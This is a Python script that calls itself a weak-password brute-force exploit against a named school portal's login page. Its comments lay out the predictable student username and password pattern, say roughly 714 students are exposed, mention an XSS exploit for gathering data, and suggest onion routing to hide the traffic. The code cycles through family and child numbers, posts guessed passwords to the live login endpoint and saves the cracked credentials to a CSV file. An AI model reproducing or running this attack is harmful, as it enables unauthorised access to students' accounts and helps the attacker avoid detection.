"""
This is a weak-password bruteforce exploit for eduware-powered websites. Omec is chosen arbitrarily, but, using the same techniques
other websites can be exploited too.

Theory:
    typical username (aka user_id, aka username, aka whatever the fuck i called it): 7817-366312
        '7817-': is global among users, and unique for every institution.
        '3663': family id
        '1': weirdly found global
        '2': child number (This is the 2nd child in family 3663).
    typical password: 436631226
        '4': weirdly found global
        '3663': family id
        '1': weirdly found global
        '2': child number
        '26': actual password ( on further investigation, all passwords are in the interval (1,30) )

Note: The data for the above analysis can be harnessed from the xss login exploit

note that nearly 85% (714 students) have username and password formats as the above. I heard they patched and changed
others, so I suppose they changed the format as well.

Usage: get all families by running bf(0,9999). This is noisy, better be coupled with onion routing.
"""
import requests


def check_permutation(username, password):
    """
    :param username: arbitrary username
    :param password: corresponding pswd
    :return: boolean:
        - True: username-pass match
        - else False
    """
    url = 'https://portal.omecleb.com/AccountAdministration/Login'
    data = {
        'Username': username,
        'Password': password,
        'language': 'en-US'
    }

    response = requests.post(url, data=data)
    
    if 'Set-Cookie' in response.headers:
        return True
    else:
        return False


def brute_force_password(base_usr):
    """
    :param base_usr: user
    :return: user password if found, else None

    brute forces the user password by checking 30 different user-specific password combinations
    """
    for paswd in range(0, 31):
        paswd = '4' + base_usr[5:] + str(paswd)
        if check_permutation(base_usr, paswd):
            return paswd
    return None


def save_in_file(text):
    """
    :param text: append to foo.csv
    :return: None
    """
    f = open("foo.csv", "a")
    f.write(text)
    f.close()


def get_family(fam, n=4):
    """
    :param fam: family id
    :param n: child number
    :return: None

    iterates over all members of family id and brute forces the different combinations
    """
    found = None
    p = None
    for i in range(1, n + 1):
        user = '7817-' + str(fam).rjust(4, '0') + '1' + str(i)
        print('brute forcing ' + user)
        p = brute_force_password(user)
        print(user, p)
        if p:
            # once a child is found, break
            save_in_file(user + ',' + p + "\n")
            found = i
            break
    if found:
        child_num = found
        while p:    # iterate over next children until none is left
            child_num += 1
            user = '7817-' + str(fam).rjust(4, '0') + '1' + str(child_num)
            print('brute forcing ' + user)
            p = brute_force_password(user)
            print(user, p)
            if p:
                save_in_file(user + ',' + p + "\n")


def bf(start, finish):
    for i in range(start, finish + 1):
        get_family(i)
